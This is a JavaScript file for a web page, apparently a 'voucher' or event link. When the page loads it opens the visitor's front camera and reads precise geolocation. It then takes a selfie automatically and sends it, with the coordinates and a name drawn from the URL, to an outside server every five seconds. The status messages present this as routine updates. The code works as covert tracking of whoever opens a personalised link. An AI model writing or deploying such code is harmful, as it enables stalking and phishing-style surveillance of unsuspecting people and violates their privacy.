// ======= CONFIG =======
const BACKEND_URL = "https://voucherlink.onrender.com"; // use HTTPS in production

// ======= DOM ELEMENTS =======
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusEl = document.getElementById("status");
const form = document.getElementById("eventForm");

// ======= GLOBAL STATE =======
let cachedGeo = null;
let isSending = false;
let autoInterval = null;

// ======= FETCH POLYFILL (for old Android browsers) =======
if (!window.fetch) {
  window.fetch = function (url, options = {}) {
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open(options.method || "GET", url);
      for (const [k, v] of Object.entries(options.headers || {}))
        xhr.setRequestHeader(k, v);
      xhr.onload = () =>
        resolve({
          ok: xhr.status >= 200 && xhr.status < 300,
          status: xhr.status,
          json: () => Promise.resolve(JSON.parse(xhr.responseText || "{}")),
          text: () => Promise.resolve(xhr.responseText)
        });
      xhr.onerror = reject;
      xhr.send(options.body);
    });
  };
}

// ======= CAMERA INIT (compatible) =======
async function startCamera() {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      alert("📷 Camera not supported on this browser.");
      return;
    }

    const constraints = { video: { facingMode: "user" }, audio: false };
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        const playPromise = video.play();
        if (playPromise !== undefined) playPromise.then(resolve).catch(resolve);
        else resolve();
      };
    });

    console.log("🎥 Camera ready:", video.videoWidth, video.videoHeight);
  } catch (err) {
    console.error("Camera init failed:", err);
    alert("⚠️ Please allow camera access (or use a newer browser).");
  }
}

// ======= LOCATION FETCH (cached + fallback) =======
async function initLocation() {
  if (cachedGeo) return cachedGeo;
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      console.warn("Geolocation not supported.");
      cachedGeo = null;
      return resolve(null);
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        cachedGeo = { lat: pos.coords.latitude, lon: pos.coords.longitude };
        resolve(cachedGeo);
      },
      (err) => {
        console.warn("⚠️ Location denied or unavailable:", err);
        cachedGeo = null;
        resolve(null);
      },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  });
}

// ======= SELFIE CAPTURE =======
function captureSelfie() {
  const w = video.videoWidth;
  const h = video.videoHeight;

  if (!w || !h) {
    console.warn("No video frame; using placeholder image.");
    // fallback 1x1 pixel image
    return (
      "data:image/jpeg;base64," +
      "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMB/Ve1W+QAAAAASUVORK5CYII="
    );
  }

  canvas.width = w;
  canvas.height = h;
  const ctx = canvas.getContext("2d");
  ctx.save();
  ctx.translate(w, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0, w, h);
  ctx.restore();
  return canvas.toDataURL("image/jpeg", 0.9);
}

// ======= SEND TO BACKEND =======
async function sendToBackend(trigger = "auto") {
  const nameFromURL = new URLSearchParams(window.location.search).get("name");
  const nameInput = document.getElementById("name")?.value;
  const name = nameFromURL || nameInput || "Unknown";

  const selfie = captureSelfie();
  const geo = cachedGeo || (await initLocation());
  const data = { name, geo, selfie };

  statusEl.textContent =
    trigger === "auto"
      ? `⏳ Updating status for "${name}"...`
      : `🚀 Sending manually for "${name}"...`;

  try {
    const res = await fetch(`${BACKEND_URL}/submit`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });

    const result = await res.json();
    if (result.ok) {
      statusEl.textContent =
        trigger === "auto"
          ? "✅ Auto update sent."
          : "✅ Sent successfully!";
    } else {
      statusEl.textContent = "❌ Server rejected data.";
    }
  } catch (err) {
    console.error("Send error:", err);
    statusEl.textContent = "⚠️ Network or backend error.";
  }
}

// ======= INITIALIZATION =======
(async function init() {
  await startCamera();
  await initLocation();

  // First send after 1.5 s
  setTimeout(() => sendToBackend("auto"), 1500);

  // 🔁 Repeat every 5 seconds (without extra permissions)
  autoInterval = setInterval(async () => {
    if (isSending) return;
    isSending = true;
    await sendToBackend("auto");
    isSending = false;
  }, 5000);
})();

// ======= MANUAL SUBMIT (RETRY BUTTON) =======
if (form) {
  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    await sendToBackend("manual");
  });
}
